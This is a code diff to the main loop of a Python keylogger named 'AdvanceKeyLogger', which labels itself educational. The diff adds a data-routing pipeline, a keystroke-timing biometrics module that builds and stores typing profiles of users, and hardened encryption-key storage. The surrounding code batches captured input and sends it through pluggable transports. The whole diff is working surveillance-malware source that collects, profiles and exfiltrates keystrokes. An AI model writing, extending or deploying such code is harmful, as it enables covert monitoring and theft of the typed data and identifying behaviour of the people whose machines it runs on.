@@ -15,27 +15,31 @@ from __future__ import annotations
 
 import argparse
 import base64
+import contextlib
+import io
 import json
 import logging
+import os
 import sys
 import time
-import io
 import zipfile
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 
+from capture import create_enabled_captures, list_captures
 from config.settings import Settings
-from utils.logger_setup import setup_logging
-from utils.process import PIDLock, GracefulShutdown
-from utils.system_info import get_system_info
-from utils.compression import gzip_data
-from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
-from utils.resilience import TransportQueue, CircuitBreaker
+from pipeline import Pipeline
+from biometrics.analyzer import BiometricsAnalyzer
 from storage.manager import StorageManager
 from storage.sqlite_storage import SQLiteStorage
-from capture import create_enabled_captures, list_captures
-from transport import list_transports, create_transport
+from transport import create_transport, list_transports
+from utils.compression import gzip_data
+from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
+from utils.logger_setup import setup_logging
+from utils.process import GracefulShutdown, PIDLock
+from utils.resilience import CircuitBreaker, TransportQueue
+from utils.system_info import get_system_info
 
 # Plugin modules are auto-imported by capture/__init__.py and
 # transport/__init__.py via their self-registration loops.
@@ -48,7 +52,10 @@ def parse_args() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         prog="AdvanceKeyLogger",
-        description="Educational input monitoring tool for learning OS APIs and software architecture.",
+        description=(
+            "Educational input monitoring tool for learning"
+            " OS APIs and software architecture."
+        ),
     )
     parser.add_argument(
         "-c", "--config",
@@ -112,10 +119,15 @@ def _zip_bundle(records_json: bytes, file_paths: list[str], compress: bool) -> b
     buffer = io.BytesIO()
     with zipfile.ZipFile(buffer, "w", compression) as zf:
         zf.writestr("records.json", records_json)
-        for filepath in file_paths:
+        seen: set[str] = set()
+        for idx, filepath in enumerate(file_paths):
             path = Path(filepath)
             if path.exists() and path.is_file():
-                zf.write(str(path), arcname=path.name)
+                arcname = path.name
+                if arcname in seen:
+                    arcname = f"{idx}_{arcname}"
+                seen.add(arcname)
+                zf.write(str(path), arcname=arcname)
             else:
                 logger.warning("Missing attachment, skipping: %s", filepath)
     return buffer.getvalue()
@@ -192,8 +204,16 @@ def _load_encryption_key(config: dict[str, Any], data_dir: str) -> bytes:
         return key_from_base64(str(key_b64))
 
     key = generate_key()
+    b64 = key_to_base64(key)
+
     key_path = Path(data_dir) / "encryption.key"
-    key_path.write_text(key_to_base64(key))
+    fd = os.open(str(key_path), os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0o600)
+    try:
+        os.write(fd, b64.encode("utf-8"))
+    finally:
+        os.close(fd)
+
+    enc_cfg["key"] = b64
     logger.warning("Encryption key generated and stored at %s", key_path)
     return key
 
@@ -243,6 +263,24 @@ def _items_from_sqlite(rows: list[dict[str, Any]]) -> tuple[list[dict[str, Any]]
             item["size"] = file_size
         items.append(item)
     return items, ids
+
+
+def _needs_sqlite_for_routes(config: dict[str, Any]) -> bool:
+    pipeline_cfg = config.get("pipeline", {}) if isinstance(config, dict) else {}
+    if not pipeline_cfg.get("enabled", False):
+        return False
+    middleware_cfgs = pipeline_cfg.get("middleware", [])
+    for entry in middleware_cfgs:
+        if not isinstance(entry, dict):
+            continue
+        if entry.get("name") != "conditional_router":
+            continue
+        if not entry.get("enabled", True):
+            continue
+        routes = (entry.get("config") or {}).get("routes", {})
+        if "sqlite" in routes.values():
+            return True
+    return False
 
 
 
@@ -303,8 +341,23 @@ def main() -> int:
         sys_info["os_release"],
     )
 
-    # --- Create capture modules ---
+    # --- Create config snapshot ---
     config = settings.as_dict()
+
+    # --- Pipeline (optional) ---
+    pipeline_enabled = bool(settings.get("pipeline.enabled", False))
+    pipeline = Pipeline(config, sys_info) if pipeline_enabled else None
+
+    # --- Biometrics (optional) ---
+    biometrics_enabled = bool(settings.get("biometrics.enabled", False))
+    biometrics_buffer: list[dict[str, Any]] = []
+    biometrics_analyzer = BiometricsAnalyzer(
+        profile_id_prefix=str(settings.get("biometrics.profile_id_prefix", "usr"))
+    )
+    biometrics_sample_size = int(settings.get("biometrics.sample_size", 500))
+    biometrics_store = bool(settings.get("biometrics.store_profiles", True))
+
+    # --- Create capture modules ---
     captures = create_enabled_captures(config)
 
     if not captures:
@@ -342,7 +395,8 @@ def main() -> int:
         rotation=bool(settings.get("storage.rotation", True)),
     )
     sqlite_store = None
-    if storage_backend == "sqlite":
+    sqlite_needed = storage_backend == "sqlite" or _needs_sqlite_for_routes(config)
+    if sqlite_needed:
         sqlite_store = SQLiteStorage(settings.get("storage.sqlite_path", "./data/captures.db"))
 
     transport = create_transport(config)
@@ -389,8 +443,42 @@ def main() -> int:
                 except Exception as exc:
                     logger.error("Collect failed for %s: %s", cap, exc)
 
+            if pipeline is not None and collected:
+                collected = pipeline.process_batch(collected)
+
+            if biometrics_enabled:
+                timing_events = [e for e in collected if e.get("type") == "keystroke_timing"]
+                if timing_events:
+                    biometrics_buffer.extend(timing_events)
+                    if len(biometrics_buffer) >= biometrics_sample_size:
+                        sample = biometrics_buffer[:biometrics_sample_size]
+                        biometrics_buffer = biometrics_buffer[biometrics_sample_size:]
+                        try:
+                            profile = biometrics_analyzer.generate_profile(sample)
+                            if biometrics_store and sqlite_store is not None:
+                                try:
+                                    sqlite_store.insert_profile(profile.to_dict())
+                                except Exception as exc:
+                                    logger.error("Failed to store biometrics profile: %s", exc)
+                            profile_event = {
+                                "type": "biometrics_profile",
+                                "data": profile.to_dict(),
+                                "timestamp": time.time(),
+                            }
+                            if biometrics_store:
+                                collected.append(profile_event)
+                        except Exception as exc:
+                            logger.error("Biometrics analysis failed: %s", exc)
+
             if sqlite_store is not None:
-                for item in collected:
+                if storage_backend == "sqlite":
+                    sqlite_items = collected
+                    queue_items: list[dict[str, Any]] = []
+                else:
+                    sqlite_items = [i for i in collected if i.get("route") == "sqlite"]
+                    queue_items = [i for i in collected if i.get("route") != "sqlite"]
+
+                for item in sqlite_items:
                     data_value = item.get("data")
                     data_str = _serialize_for_storage(data_value) if data_value is not None else ""
                     file_path = item.get("path") or item.get("file_path") or ""
@@ -406,6 +494,9 @@ def main() -> int:
                         file_path=file_path,
                         file_size=file_size,
                     )
+
+                if queue_items:
+                    queue.enqueue_many(queue_items)
 
                 pending_rows = sqlite_store.get_pending(limit=batch_size)
                 batch_items, batch_ids = _items_from_sqlite(pending_rows)
@@ -472,10 +563,8 @@ def main() -> int:
     if sqlite_store is not None:
         sqlite_store.close()
 
-    try:
+    with contextlib.suppress(Exception):
         transport.disconnect()
-    except Exception:
-        pass
 
     shutdown.restore()
     logger.info("AdvanceKeyLogger stopped.")
